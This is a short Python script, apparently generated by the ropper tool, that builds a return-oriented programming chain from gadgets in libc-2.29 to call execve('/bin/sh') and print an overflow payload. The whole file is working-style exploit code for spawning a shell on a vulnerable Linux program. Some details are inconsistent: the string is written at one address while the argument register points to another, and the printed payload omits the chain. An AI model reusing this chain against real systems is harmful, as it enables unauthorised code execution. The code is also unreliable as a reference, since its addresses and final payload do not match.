

#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x00007ffff7ddb000 # /lib/x86_64-linux-gnu/libc-2.29.so
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x0000000000028749) # 0x00007ffff7e03749: pop r13; ret; 
rop += '//bin/sh'
rop += rebase_0(0x000000000002fb33) # 0x00007ffff7e0ab33: pop rbx; ret; 
rop += rebase_0(0x00000000001b91a0)
rop += rebase_0(0x0000000000053e85) # 0x00007ffff7e2ee85: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000028749) # 0x00007ffff7e03749: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000002fb33) # 0x00007ffff7e0ab33: pop rbx; ret; 
rop += rebase_0(0x00000000001ba1a8)
rop += rebase_0(0x0000000000053e85) # 0x00007ffff7e2ee85: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002658e) # 0x00007ffff7e0158e: pop rdi; ret; 
rop += rebase_0(0x00000000001ba1a0)
rop += rebase_0(0x0000000000026aa9) # 0x00007ffff7e01aa9: pop rsi; ret; 
rop += rebase_0(0x00000000001ba1a8)
rop += rebase_0(0x0000000000107565) # 0x00007ffff7ee2565: pop rdx; ret; 
rop += rebase_0(0x00000000001ba1a8)
rop += rebase_0(0x000000000003cff8) # 0x00007ffff7e17ff8: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000b7405) # 0x00007ffff7e92405: syscall; ret; 
# print rop
nops = '\x90'
payload = nops*40 + pack('Q',0x00007ffff7e03749)#rop# + binsh + sys + ex
print(payload)